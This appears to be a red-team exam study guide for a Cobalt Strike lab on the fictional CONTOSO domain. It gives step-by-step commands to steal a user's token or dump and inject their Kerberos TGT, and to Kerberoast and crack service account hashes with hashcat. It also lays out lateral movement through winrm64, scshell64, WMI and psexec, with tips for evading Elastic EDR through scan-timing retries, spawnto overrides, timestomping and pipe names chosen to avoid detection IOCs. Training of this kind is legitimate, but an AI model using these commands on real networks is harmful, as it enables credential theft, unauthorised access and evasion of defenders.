# User Impersonation Lab

> **Objective:** Dump a user's TGT from their active logon session and impersonate it to
> access remote resources as that user — without knowing their password.

> **Where this fits in the exam attack chain:**
> ```
> SYSTEM beacon (from Privilege Escalation)
>   → [THIS LAB] Dump TGT → impersonate user → access remote resources
>   → Lateral Movement (as rsteel — Server Admin, Database Admin, Workstation Admin)
>   → Domain Dominance
> ```

> **Why this technique exists:**
> You have SYSTEM on a workstation. You cannot move laterally with the machine account
> (`lon-wkstn-1$`) — it has no admin rights on other hosts. You need to impersonate a
> domain user whose TGT is cached on this host to authenticate to remote systems.
> Two methods exist — choose based on what's available:

| Method | OPSEC | Requires | When to use |
|--------|-------|----------|-------------|
| `steal_token <pid>` | 🟢SAFE | Target user running a process on this host | **Preferred — always try first** |
| `make_token` + `kerberos_ticket_use` | 🟠CAUTION | User's TGT (from `krb_dump`) | When no process from that user is running |

---

## Prerequisite

⚠️ Load Kerbeus-BOF aggressor script if not already loaded:
```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

---

## Step 0 — Verify access is denied without impersonation

```cs
beacon> ls \\lon-ws-1\c$
// Expected: ERROR_ACCESS_DENIED — machine account has no admin rights on lon-ws-1
```

---

## Step 1 — Check for running processes from target user

From the SYSTEM beacon `ps` output, look for processes running as the target user:

```cs
beacon> ps
// Look for any process where User = CONTOSO\rsteel
// e.g. cmd.exe, mmc.exe, explorer.exe owned by rsteel
```

**If `rsteel` has a running process → go to Method A (steal_token).**
**If no process from `rsteel` → go to Method B (krb_dump + make_token).**

---

## Method A — steal_token (OPSEC-🟢SAFE — preferred)

```cs
beacon> steal_token <rsteel-PID>     // duplicates token from rsteel's process — no logon event
beacon> getuid                       // confirm CONTOSO\rsteel
beacon> ls \\lon-ws-1\c$             // verify access
beacon> ls \\lon-fs-1\c$             // rsteel = Server Admin — check other targets
beacon> rev2self                     // drop impersonation after use
```

**OPSEC:** `OPSEC-🟢SAFE`
- `steal_token` duplicates an existing token via `DuplicateTokenEx` — operates entirely in-process
- No logon session created — no Event 4624 or 4648
- No network authentication — no Event 4768/4769
- No disk writes, no child processes

**Limitation:** Only works while rsteel has an active process on this host. If the user logs off, the process disappears and the token is gone.

---

## Method B — krb_dump + make_token + kerberos_ticket_use

Use when `steal_token` is not available (no target process running).

### Step 1 — Triage tickets (OPSEC-🟢SAFE)

```cs
beacon> krb_triage
```

Look for: `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`

Note the LUID — you need it for the dump. With SYSTEM beacon, `krb_triage` shows **all users'**
tickets (not just the current session), including pchilds, rsteel, and the machine account.

**Key LUIDs to understand:**

| LUID | Account | Notes |
|------|---------|-------|
| `0x3e7` | `lon-wkstn-1$` | SYSTEM logon session — machine account TGT |
| `0x3e4` | `lon-wkstn-1$` | Network service logon session |
| Any other | Domain user | Interactive or network logon — user TGT |

### Step 2 — Dump rsteel's TGT (OPSEC-🟠CAUTION)

```cs
beacon> krb_dump /user:rsteel /service:krbtgt
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Kerbeus-BOF reads from LSASS via Kerberos API — no raw `ReadProcessMemory` on LSASS
- Less detectable than Mimikatz `sekurlsa::tickets` but still touches LSASS indirectly
- Event 4769 (Kerberos service ticket request) may fire on the DC — not directly from this command
- Elastic EDR and Sysmon will log the BOF execution (via the beacon process)

Copy the base64 kirbi from the output.

### Step 3 — Save kirbi to attacker desktop

On attacker desktop PowerShell (not in beacon):
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

### Step 4 — Create sacrificial logon session (OPSEC-🟠CAUTION)

```cs
beacon> make_token CONTOSO\rsteel FakePass
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Creates a Type 9 (NewCredentials) logon session — **Event 4648 logged**
- The password is fake — it is never validated by the DC
- The logon session is local only — used as a container to hold the injected Kerberos ticket
- Event 4648 shows `CONTOSO\rsteel` logged on from this machine — visible to SIEM

**Why FakePass works:**
`make_token` with `/netonly` semantics creates a logon session without validating credentials
locally. The ticket you inject next provides the actual Kerberos authentication — the password
field is irrelevant for ticket-based auth.

### Step 5 — Inject TGT into the logon session (OPSEC-🟠CAUTION)

```cs
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Calls `LsaCallAuthenticationPackage` with `KerbSubmitTicketMessage` — injects ticket into
  the logon session created by `make_token`
- Not directly signatured, but Elastic EDR hooks LSASS API calls — visible in telemetry

### Step 6 — Verify ticket is loaded

```cs
beacon> run klist
```

**OPSEC:** `OPSEC-🔴UNSAFE` — `run` spawns `cmd.exe` as a child process
Use `powerpick` instead if you want to avoid the child process:
```cs
beacon> powerpick klist    // OPSEC-🟠CAUTION — unmanaged PS, no cmd.exe
```

### Step 7 — Access remote resource

```cs
beacon> ls \\lon-ws-1\c$     // should succeed now — rsteel is Workstation Admin
beacon> ls \\lon-fs-1\c$     // rsteel is Server Admin
```

### Step 8 — Drop impersonation

```cs
beacon> rev2self
```

**Always run `rev2self` after completing the task** — leaves the logon session open but stops
using the stolen token. The logon session is purged when the beacon exits.

---

## OPSEC — steal_token vs make_token Comparison

| | `steal_token` | `make_token` + `kerberos_ticket_use` |
|--|---|---|
| Tier | 🟢SAFE | 🟠CAUTION |
| Logon event | None | Event 4648 on local host |
| LSASS touch | None | Kerberos API via LSASS |
| Requires | Target process running | TGT from `krb_dump` |
| Works after user logs off | No | Yes (while kirbi is valid) |
| Exam preference | **Always try first** | Fallback |

---

## OPSEC Warnings

### run klist — spawns cmd.exe
```cs
beacon> run klist           // OPSEC-🔴UNSAFE — spawns cmd.exe visible to Sysmon Event 1
beacon> powerpick klist     // OPSEC-🟠CAUTION — preferred, no cmd.exe child
```

### Kerberoasting — check for honeypots first
Before Kerberoasting any SPN account, confirm it is not a honeypot:
```cs
// Check the SPN name — suspicious indicators:
// - SPN points to non-existent host (e.g. lon-pooh-1, honeypot-srv)
// - Account has adminCount=1 but no real group membership
// - Account name itself sounds like a trap (crobin, honeysvc)

// Safe to roast:
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// NEVER roast — confirmed honeypot in CONTOSO lab:
// crobin — servicePrincipalName: HoneySvc/lon-pooh-1.contoso.com
```

### make_token leaves a logon session open
The Type 9 logon session created by `make_token` persists until the beacon exits or you
explicitly purge it. During its lifetime, a SIEM analyst can see `rsteel` LUID active on
`lon-wkstn-1`. Always `rev2self` immediately after completing the access.

---

## Lab-Confirmed Findings (2026-04-18)

**rsteel's TGT present on lon-wkstn-1:** LUID `0x19cc19`, AES256, forwardable, renewable.
`rsteel` had active processes (`cmd.exe` PID 7208, `mmc.exe` PID 1328) — `steal_token` was viable.

**Method A (steal_token 1328) confirmed:** `getuid` returned `CONTOSO\rsteel (admin)`. `ls \\lon-ws-1\c$` succeeded.

**Method B (make_token + kerberos_ticket_use) confirmed:** TGT injected into new logon session (LUID `0x3fd25d`). `ls \\lon-ws-1\c$` succeeded. After access, `klist` showed auto-issued TGS: `cifs/lon-ws-1 @ CONTOSO.COM` — normal Kerberos ST behaviour.

**lon-fs-1 not reachable from this lab:** `ls \\lon-fs-1\c$` returned `ERROR_BAD_NETPATH (53)` — not access denied, DNS/host not provisioned in User Impersonation lab. This lab only runs: Attacker, DC, Workstation, Web Server. On exam day, verify which hosts are live before trying lateral access.

**OPSEC incident — `run klist` used:** Spawned `cmd.exe` as child of beacon — Sysmon Event 1 generated. On exam day use `powerpick klist` only.

**CONTOSO domain — no trusts:** Trust enumeration returned 0 results — single domain, no forest.

**Kerberoastable accounts:**
- `mssql_svc` — `MSSQLSvc/lon-db-1.contoso.com:1433` — legitimate target
- `LON-DB-2$` — `MSSQLSvc/lon-db-2.contoso.com:1433` — machine account with SQL SPN

**Honeypot confirmed:**
- `crobin` — `HoneySvc/lon-pooh-1.contoso.com` — do NOT Kerberoast

**ADCS server identified:**
- `LON-CS-1$` — member of `Cert Publishers` + `Pre-Windows 2000 Compatible Access` — Certificate Services host

**Crack Kerberoast hash (attacker Kali):**
```bash
hashcat -a 0 -m 13100 mssql_svc.hash /usr/share/wordlists/rockyou.txt
```

---

## Why Plaintext Passwords Are Not Required

Token/ticket impersonation bypasses the need to crack hashes entirely. Know Kerberoasting as a technique for exam scoring, but do not depend on cracking being in the critical path.

| Goal | Technique | Needs plaintext? |
|------|-----------|-----------------|
| Lateral movement | `steal_token` + `jump winrm64` | No |
| Lateral movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | No — fake pass works |
| NTLM-based lateral | `pth` | NTLM hash only — no plaintext |
| Domain recon | `ldapsearch` BOF | No |
| Access remote share | stolen TGT + `kerberos_ticket_use` | No |

**When plaintext is actually required:**
- RDP with password authentication (rare in exam)
- Credential spraying if no tickets available

**Exam path:** `steal_token` → `jump winrm64` → new beacon as impersonated user. Token/ticket impersonation is always faster and stealthier than waiting on hashcat.

---

## Lateral Movement — All Jump Methods (Post-Impersonation Exam Reference)

> Run these **after** `steal_token` or `make_token` + `kerberos_ticket_use`. Work top-to-bottom — stop at the first method that gives you a live beacon. Each method has a different detection profile; know when to fall down.

### Pre-flight — Always set spawnto before jumping

```cs
// For WinRM / inject-based jumps (fork & run into remote process)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// For service-based jumps (scshell64, psexec64)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> Default spawnto is `rundll32.exe` — signatured by every major EDR. Always override before any `jump` command.

---

### Method 1 — jump winrm64 `OPSEC-🟢SAFE`

**First choice. Use when WinRM is enabled on target (default on servers, not workstations).**

```cs
beacon> powerpick Test-WSMan <target>       // test reachability — OPSEC-🟢SAFE, no child proc
beacon> jump winrm64 <target> <listener>
beacon> rev2self
```

| Property | Detail |
|----------|--------|
| Mechanism | WinRM executes shellcode, injects into `wsmprovhost.exe` |
| Service created | No |
| Event 7045 | No |
| Event 4648 | No (if steal_token used) |
| Disk write | No |
| Child process on source | No |

**EDR caveat + retry behaviour (lab-confirmed 2026-04-19):**
`jump winrm64` generates the SMB beacon payload on-the-fly. Elastic Endpoint may kill it on first attempt (`ERROR_FILE_NOT_FOUND`). **Always retry once before falling down** — Elastic has a scan latency window and the second attempt often succeeds within 10–15 seconds of the first.

```
Attempt 1 → ERROR_FILE_NOT_FOUND  (Elastic killed beacon before pipe created)
Wait 10-15 seconds
Attempt 2 → established link      (payload executed inside EDR scan window gap)
```

Only fall to Method 2 if two consecutive attempts both return `ERROR_FILE_NOT_FOUND`.

---

### Method 2 — jump scshell64 `OPSEC-🟠CAUTION`

**Use when WinRM is disabled or payload gets caught. Modifies an existing service — no new service created.**

```cs
// Load CNA first if not already loaded:
// CS → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna

beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> <listener>
beacon> rev2self
```

| Property | Detail |
|----------|--------|
| Mechanism | Modifies existing service `ImagePath` via SCM RPC — runs payload as SYSTEM |
| Service created | No (modifies existing) |
| Event 7045 | No |
| Event 7040 | **Yes** — service config changed |
| Disk write | No |
| Requires | Local admin on target |

> SCShell restores the original service path after execution — Event 7040 fires twice (change + restore). Less noisy than psexec but still visible to a tuned SIEM.

---

### Method 3 — remote-exec wmi `OPSEC-🟠CAUTION`

**Use when SCM-based methods are blocked. WMI process creation — no service at all.**

```cs
// Pre-stage payload on target first (see Method 4 for upload steps)
beacon> remote-exec wmi <target> C:\Windows\Temp\smb_x64.exe
```

| Property | Detail |
|----------|--------|
| Mechanism | WMI `Win32_Process.Create` — spawns payload as SYSTEM |
| Service created | No |
| Event 7045 | No |
| Event 4688 | **Yes** — process creation on target |
| WMI activity log | **Yes** — `Microsoft-Windows-WMI-Activity/Operational` |
| Disk write | Requires pre-staged binary |

---

### Method 4 — Pre-staged payload + remote-exec `OPSEC-🟠CAUTION`

**Use when EDR catches auto-generated `jump` payloads. Custom-built payloads in `C:\Payloads\` evade signature scanning.**

```cs
// Upload pre-built SMB beacon to target via C2 channel
beacon> upload C:\Payloads\smb_x64.exe         // uploaded to CWD on target — use cd first
beacon> cd \\<target>\c$\Windows\Temp
beacon> upload C:\Payloads\smb_x64.exe
beacon> timestomp \\<target>\c$\Windows\Temp\smb_x64.exe \\<target>\c$\Windows\System32\svchost.exe

// Execute via WinRM (preferred)
beacon> remote-exec winrm <target> C:\Windows\Temp\smb_x64.exe

// Or via WMI
beacon> remote-exec wmi <target> C:\Windows\Temp\smb_x64.exe

// Cleanup after beacon checks in
beacon> rm \\<target>\c$\Windows\Temp\smb_x64.exe
```

> `C:\Payloads\smb_x64.exe` is a pre-compiled stageless SMB beacon built with the custom artifact kit. It has sleep mask, stomped PE headers, and no default pipe names — designed to survive EDR memory scanning where auto-generated payloads fail.

---

### Method 5 — jump psexec64 `OPSEC-🔴UNSAFE` — Last Resort Only

**Creates a new service (Event 7045). Only use if all other methods fail.**

```cs
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump psexec64 <target> <listener>
beacon> rev2self
```

| Property | Detail |
|----------|--------|
| Mechanism | Creates a new service, runs payload, deletes service |
| Service created | **Yes** |
| Event 7045 | **Yes** — new service installed |
| Event 7009 | **Yes** — service timeout if beacon doesn't exit cleanly |
| Disk write | **Yes** — service binary written temporarily |
| Noise | Maximum — flagged by virtually all SIEMs and EDRs |

> On the CRTO exam, using psexec without flagging the OPSEC cost will lose OPSEC points even if the flag is captured. Always document why you had to fall to this method.

---

### Decision Flow — Exam Day

```
Have token/ticket? (steal_token preferred — no Event 4648)
  │
  ├─ Is WinRM open? (Test-WSMan <target>)
  │     │
  │     └─ YES → jump winrm64 <target> smb_custom   (🟢SAFE — first choice)
  │                 │
  │                 ├─ SUCCESS            → done
  │                 ├─ ERROR_LOGON_FAILURE → auth broken — fix steal_token/ticket, do not retry jump yet
  │                 └─ ERROR_FILE_NOT_FOUND → EDR timing kill
  │                       └─ wait 10-15s → retry winrm64 ONCE
  │                             ├─ SUCCESS  → done (🟢SAFE)
  │                             └─ FAIL x2  → jump scshell64 (🟠CAUTION, Event 7040)
  │                                   └─ FAIL → remote-exec winrm + C:\Payloads\smb_x64.exe
  │                                         └─ FAIL → jump psexec64 (🔴UNSAFE, last resort)
  │
  └─ WinRM closed → jump scshell64 directly (🟠CAUTION)
```

### OPSEC Comparison Table

| Method | Event 7045 | Event 7040 | Event 4688 | Disk write | EDR survival | Exam preference |
|--------|-----------|-----------|-----------|-----------|-------------|-----------------|
| `jump winrm64` | No | No | No | No | Low (auto payload) | 1st — custom payload |
| `jump scshell64` | No | **Yes** | No | No | Medium | 2nd |
| `remote-exec wmi` + staged | No | No | **Yes** | **Yes** | High (custom payload) | 3rd |
| `remote-exec winrm` + staged | No | No | No | **Yes** | High (custom payload) | 1st (EDR env) |
| `jump psexec64` | **Yes** | No | **Yes** | **Yes** | Low | Last resort 🔴 |

### Lab-Observed: Elastic Endpoint Behaviour (2026-04-19)

**All hosts confirmed running:** `elastic-agent.exe`, `elastic-endpoint.exe`, `MsMpEng.exe`, `Sysmon64.exe`

**winrm64 findings — Unconstrained Delegation lab:**
- Source beacon died after `jump winrm64` — Elastic had already tracked/flagged the beacon process in that lab instance
- Likely cause: beacon was already an active detection target before the jump — fresh lab instances behave differently
- Not a reliable indicator of winrm64 capability — environment state matters

**winrm64 findings — Constrained Delegation lab (fresh instance):**
- Attempt 1 with `smb` (TSVCPIPE-*) → `ERROR_FILE_NOT_FOUND` — Elastic kills beacon on lon-fs-1 before pipe created
- Attempt 2 (13s later) with `smb` → `[+] established link` — **succeeded** via scan latency gap
- `smb_custom` (mojo pipe) → `[+] established link` **first attempt** — may be pipe name effect, may be fresh Elastic state
- Conclusion: **retry winrm64 once before falling to scshell64** — timing/environment state is a factor

**scshell64 findings:**
- `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` required first
- Payload binary (`evil59.exe`) written to `\\target\C$\Windows\System32\` — transient, auto-deleted
- `defragsvc` service path modified (Event 7040 × 2) — restored after execution
- Beacon established **first attempt in both lab instances** — most reliable delivery method observed
- OPSEC cost: Event 7040 × 2, brief disk write to System32

**Auth method conclusion:** `steal_token` required for WinRM auth — uses real Kerberos TGT from the target process token. `make_token` without `kerberos_ticket_use` = `ERROR_LOGON_FAILURE` — WinRM rejects fake credentials. Never use `make_token` alone for WinRM lateral movement.

**Pipe name conclusion:** Pipe name is NOT the primary Elastic detection vector — payload content in memory is. However, custom pipe names are still required for exam OPSEC score (examiner reviews artifacts) and to avoid MDI/threat hunting detections on `TSVCPIPE-*`. See pipe name guidance below.

---

### SMB Listener Pipe Name — Exam Day

**Do NOT use `mojo.5688.8052.183894939787088877`** — this specific value has been documented in threat intelligence reports since 2019 (FalconForce, Red Canary, Elastic detection rules). It is as signatured as `TSVCPIPE-*` in modern detection tooling.

**Do NOT use any of these — all documented CS IOCs:**
```
TSVCPIPE-*       ← CS default
mojo.*           ← documented evasion technique since 2019
msagent_*        ← CS default
postex_*         ← CS default
MSSE-*-server    ← CS default
```

**Use on exam day — blends with legitimate Windows/application pipes:**

```
CS → Listeners → Add (SMB) → Pipename field:

Option 1 — matches post-ex profile pipename pattern (consistent across all CS pipes):
  dotnet-diagnostic-#####
  (CS replaces each # with a random digit — different every session)

Option 2 — GUID format (generic, common in Windows IPC):
  ########-####-####-####-############

Option 3 — Windows service pipe pattern:
  wkssvc-########
  ntsvcs-########
```

> `#` is a CS wildcard — replaced with a random hex digit when the listener is created. Use this format so your pipe name is unique each exam session and never matches a documented IOC list.

Your malleable profile already sets `post-ex.pipename "dotnet-diagnostic-#####, ########-####-####-####-############"` — use `dotnet-diagnostic-#####` for the SMB listener too, so all CS named pipes follow the same pattern and blend together as .NET runtime diagnostic pipes.
